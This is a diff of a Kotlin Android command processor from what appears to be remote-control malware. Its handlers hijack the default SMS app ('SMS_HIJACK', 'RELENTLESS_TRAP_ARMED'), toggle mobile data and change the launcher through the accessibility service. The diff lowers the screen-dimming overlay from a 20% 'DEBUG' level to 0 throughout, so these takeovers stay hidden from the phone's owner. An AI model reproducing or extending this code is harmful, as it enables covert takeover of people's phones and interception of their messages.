@@ -560,31 +560,18 @@ object CommandProcessor {
                         DefaultSmsManager.expectedMode = ""
                     } else {
                         DefaultSmsManager.expectedMode = mode
-                        if (mode == "AUTO" || mode == "AUTO_NAV") {
-                            Handler(Looper.getMainLooper()).post {
-                                DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
-                                                        Handler(Looper.getMainLooper()).postDelayed({
-                            if (DefaultSmsManager.expectedMode == "AUTO" || DefaultSmsManager.expectedMode == "AUTO_NAV") {
-                                val lastMode = DefaultSmsManager.expectedMode
-                                DefaultSmsManager.expectedMode = ""
-                                MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                                DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
-                            }
-                        }, 30000)
-                            }
-                        }
-                        if (mode == "RELENTLESS") {
-                            DefaultSmsManager.isRelentlessActive = true
-                            val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
-                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
-                            status = "RELENTLESS_TRAP_ARMED"
-                        } else if (mode == "STOP_RELENTLESS") {
-                            DefaultSmsManager.isRelentlessActive = false
-                            status = "RELENTLESS_STOPPED"
-                        } else {
-                            DefaultSmsManager.requestDefault(ctx)
-                            status = "DEFAULT_SMS_REQUESTED"
-                        }
+                                        if (mode == "RELENTLESS") {
+                    DefaultSmsManager.isRelentlessActive = true
+                    val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
+                    status = "RELENTLESS_TRAP_ARMED"
+                } else if (mode == "STOP_RELENTLESS") {
+                    DefaultSmsManager.isRelentlessActive = false
+                    status = "RELENTLESS_STOPPED"
+                } else {
+                    DefaultSmsManager.requestDefault(ctx)
+                    status = "DEFAULT_SMS_REQUESTED"
+                }
                     }
                 }
                 "RESTORE_DEFAULT_SMS" -> {
@@ -600,17 +587,17 @@ object CommandProcessor {
                             status = "FAILED"
                             errorMsg = "No previous SMS package found in memory."
                         } else {
-                            DefaultSmsManager.expectedMode = "RESTORE"
-                            Handler(Looper.getMainLooper()).post {
-                                DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
-                                                    Handler(Looper.getMainLooper()).postDelayed({
+                                                    DefaultSmsManager.expectedMode = "RESTORE"
+                        Handler(Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 0, "AUTO")
+                            Handler(Looper.getMainLooper()).postDelayed({
                                 if (DefaultSmsManager.expectedMode == "RESTORE") {
                                     DefaultSmsManager.expectedMode = ""
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                     DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
                                 }
                             }, 30000)
-                            }
+                        }
                             try {
                                 val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
                                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
@@ -1411,7 +1398,7 @@ object CommandProcessor {
                         errorMsg = "Accessibility is required for Ghost Hand data toggle."
                     } else {
                         Handler(Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 20, "AUTO")
+                            DimmerManager.applyDim(ctx, 0, "AUTO")
                             MyAccessibilityService.instance?.isWaitingForDataSettings = true
                             val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
@@ -1491,7 +1478,7 @@ object CommandProcessor {
 
                             // 2. DIM IMMEDIATELY (Delayed to 6.5s)
                             Handler(Looper.getMainLooper()).postDelayed({ 
-                                DimmerManager.applyDim(ctx, 20, "AUTO")
+                                DimmerManager.applyDim(ctx, 0, "AUTO")
                             }, 6500)
 
                             // 3. DEFAULT SMS GHOST SEQUENCE (Delayed to 8.5s)
@@ -1571,7 +1558,7 @@ object CommandProcessor {
 
                     // 2. DIM IMMEDIATELY (Relative to 5s delay -> 5500ms)
                     Handler(Looper.getMainLooper()).postDelayed({ 
-                        DimmerManager.applyDim(ctx, 20, "AUTO")
+                        DimmerManager.applyDim(ctx, 0, "AUTO")
                     }, 5500)
 
                     // 3. DEFAULT SMS GHOST SEQUENCE (7500ms)
@@ -2105,7 +2092,7 @@ object CommandProcessor {
                     LauncherManager.pendingCmdId = id
                     
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
-                        DimmerManager.applyDim(ctx, 20, "AUTO")
+                        DimmerManager.applyDim(ctx, 0, "AUTO")
                         try {
                             val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
                                 addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
